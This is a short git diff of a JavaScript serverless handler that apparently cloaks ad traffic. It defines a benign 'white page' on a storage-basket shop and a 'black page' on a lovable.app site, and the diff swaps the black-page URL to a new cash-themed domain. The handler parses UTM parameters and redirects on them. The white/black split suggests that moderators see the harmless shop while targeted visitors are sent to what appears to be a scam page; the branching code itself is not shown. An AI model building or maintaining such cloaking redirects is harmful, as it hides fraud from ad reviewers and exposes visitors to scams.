@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
     const whitePageURL = "https://snugnplay.com/collections/storage-organizers/products/cotton-rope-basket-with-handles-38-x-36cm-grey-white-toy-laundry-storage-basket";
-    const blackPageURL = "https://rewardfalltheme.lovable.app";
+    const blackPageURL = "https://cashhpplogo.lovable.app";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
